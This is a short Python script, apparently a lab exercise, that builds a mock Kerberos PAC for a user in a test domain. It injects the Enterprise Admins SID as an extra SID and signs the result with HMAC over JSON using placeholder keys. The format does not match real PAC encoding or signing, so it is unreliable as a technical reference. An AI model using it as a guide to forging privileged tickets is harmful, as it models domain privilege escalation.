import json
import base64
import hashlib
import hmac

def create_hmac(data_str, key):
    """Create HMAC-SHA256 checksum."""
    print(f"Generating HMAC with key: {key}")
    return hmac.new(key=key.encode(), msg=data_str.encode(), digestmod=hashlib.sha256).hexdigest()

# PAC Data
pac_data = {
    "LogonInfo": {
        "UserSID": "S-1-5-21-123456789-234567890-3456789012-1104",  # Gabriela’s user SID
        "GroupSIDs": [
            "S-1-5-21-123456789-234567890-3456789012-513"  # Domain Users
        ],
        "UserName": "gabriela",
        "UserDomain": "PRAIRIE-FIRE",
        "LogonTime": "2025-06-25T20:30:00Z",
        "UserFlags": ["LOGON_SCRIPT"],
        "ProfilePath": None,
        "UserId": 1104,
        "PrimaryGroupId": 513,
        "LogonServer": "DC01",
        "LogonDomainId": "S-1-5-21-123456789-234567890-3456789012",
        "LogonScript": None
    },
    "ClientName": "gabriela@PRAIRIE-FIRE.LAB",
    "ChecksumServer": "krbtgt/PRAIRIE-FIRE.LAB",
    "Signature": {
        "ServerChecksum": None,
        "KDCChecksum": None
    },
    "ExtraFields": {
        "SIDHistory": [],
        "RoamingProfile": None,
        "ExtraSIDs": [
            "S-1-5-21-123456789-234567890-3456789012-519"  # Enterprise Admins
        ]
    }
}

# Generate checksums
print("Creating PAC HMAC checksums...")

raw_logoninfo = json.dumps(pac_data["LogonInfo"], sort_keys=True)
pac_data["Signature"]["ServerChecksum"] = create_hmac(raw_logoninfo, key="srvkey")
pac_data["Signature"]["KDCChecksum"] = create_hmac(raw_logoninfo, key="krbtgtkey")

# Step 3: Final PAC JSON and base64 encoding
print("\nFinal PAC JSON:")
final_json_str = json.dumps(pac_data, indent=2)
print(final_json_str)

print("\nBase64 Encoded PAC:")
base64_encoded = base64.b64encode(final_json_str.encode()).decode()
print(base64_encoded)
